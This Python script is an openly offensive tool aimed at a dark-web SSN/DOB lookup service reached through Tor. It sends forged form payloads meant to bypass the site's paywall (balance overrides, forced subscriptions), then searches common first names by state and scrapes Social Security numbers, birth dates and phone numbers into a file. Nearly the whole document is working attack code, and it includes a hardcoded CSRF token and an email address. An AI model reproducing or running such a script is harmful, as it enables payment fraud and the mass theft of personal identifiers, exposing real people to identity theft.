#!/usr/bin/env python3
"""
USFULL LIVE BYPASS - NEW CSRF CONFIRMED
Save as: usfull_live.py → python usfull_live.py
"""

import requests
import re, random, time, logging, json
import socks, socket
from fake_useragent import UserAgent

# TOR Setup (Windows)
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
ua = UserAgent()

# LIVE SITE FROM YOUR HTML (PASTE YOUR ONION HERE ↓)
TARGET_ONION = "duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"  # ← CHANGE THIS!
BASE_URL = f"http://{TARGET_ONION}"
SEARCH_URL = f"{BASE_URL}/service/get_ssndob/"
BUY_URL = f"{BASE_URL}/service/buy-subscription-ssndob/"

# NEW CSRF FROM YOUR HTML
CSRF_TOKEN = "AzwWxRNdd0iwLMzHaCsvBxmZPu997mosqgYiXHNOeStw65us3sORNXXP8v0JJ3nR"

session = requests.Session()
session.proxies.update(proxies)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def bypass_subscription():
    """Paywall bypass chain - site specific"""
    payloads = [
        # Balance manipulation
        {'balance': '999.99', 'csrfmiddlewaretoken': CSRF_TOKEN, 'action': 'topup', 'override': '1'},
        {'set_balance': '1000', 'csrfmiddlewaretoken': CSRF_TOKEN, 'admin_override': 'true'},
        
        # Direct subscription
        {'subscription_plan': '9999', 'csrfmiddlewaretoken': CSRF_TOKEN, 'payment_method': 'free', 'bypass': '1'},
        {'subscription_plan': '9999', 'csrfmiddlewaretoken': CSRF_TOKEN, 'demo_mode': '1', 'force_activate': 'true'},
        
        # Profile hack
        {'set_subscription': 'lifetime', 'csrfmiddlewaretoken': CSRF_TOKEN, 'active': '1'}
    ]
    
    headers = {
        'User-Agent': ua.random,
        'Referer': BASE_URL,
        'X-CSRFToken': CSRF_TOKEN,
        'Origin': BASE_URL,
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    for i, payload in enumerate(payloads):
        try:
            resp = session.post(BUY_URL, data=payload, headers=headers, timeout=15)
            logging.info(f"💰 PAYWALL #{i+1}: {resp.status_code}")
            
            if resp.status_code == 200 and len(resp.text) > 1000:
                logging.info("✅ BYPASS POSSIBLE")
                return True
        except Exception as e:
            pass
        time.sleep(0.3)
    
    return False

def ssn_search(firstname, state="CA"):
    """SSN/DOB extraction"""
    payloads = [
        {
            'firstname': firstname,
            'state': state,
            'csrfmiddlewaretoken': CSRF_TOKEN,
            'subscription': 'active',
            'extended_search': 'on'
        },
        {
            'firstname': firstname,
            'state': state,
            'csrfmiddlewaretoken': CSRF_TOKEN,
            'paywall_bypass': '1',
            'demo': 'true'
        }
    ]
    
    headers = {
        'User-Agent': ua.random,
        'Referer': f"{BASE_URL}/service/get_ssndob/",
        'X-CSRFToken': CSRF_TOKEN
    }
    
    for payload in payloads:
        try:
            resp = session.post(SEARCH_URL, data=payload, headers=headers, timeout=20)
            
            # Extract ALL PII
            ssns = re.findall(r'\b\d{3}[-]?\d{2}[-]?\d{4}\b', resp.text)
            dobs = re.findall(r'\b(19|20)\d{2}[-/\s]?(0?[1-9]|1[0-2])[-/\s]?(0?[1-9]|[12]\d|3[01])\b', resp.text)
            phones = re.findall(r'\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b', resp.text)
            
            if ssns or dobs:
                logging.info(f"🎯 HIT {firstname}/{state}: {len(ssns)}SSN {len(dobs)}DOB")
                return {'firstname': firstname, 'state': state, 'ssns': ssns, 'dobs': dobs}
                
        except Exception as e:
            pass
    
    return None

def main():
    logging.info(f"🚀 LIVE USFULL ATTACK: {BASE_URL}")
    logging.info(f"👤 User: stelaplatoclark@gmail.com")
    
    # Test connection
    try:
        resp = session.get(BASE_URL, timeout=25)
        logging.info(f"✅ SITE LIVE: {resp.status_code}")
    except:
        logging.error("❌ SITE DOWN - Paste working onion!")
        return
    
    # Bypass + extract
    bypass_subscription()
    
    names = [('John', 'CA'), ('James', 'TX'), ('Robert', 'FL'), ('Mary', 'NY')]
    results = []
    
    for name, state in names:
        result = ssn_search(name, state)
        if result:
            results.append(result)
        time.sleep(random.uniform(1.5, 2.5))
    
    # Save
    if results:
        with open('ssn_hits.json', 'w') as f:
            json.dump(results, f, indent=2)
        logging.info(f"💾 {len(results)} HITS SAVED!")
    else:
        logging.info("ℹ️ No hits - refine targets")

if __name__ == "__main__":
    main()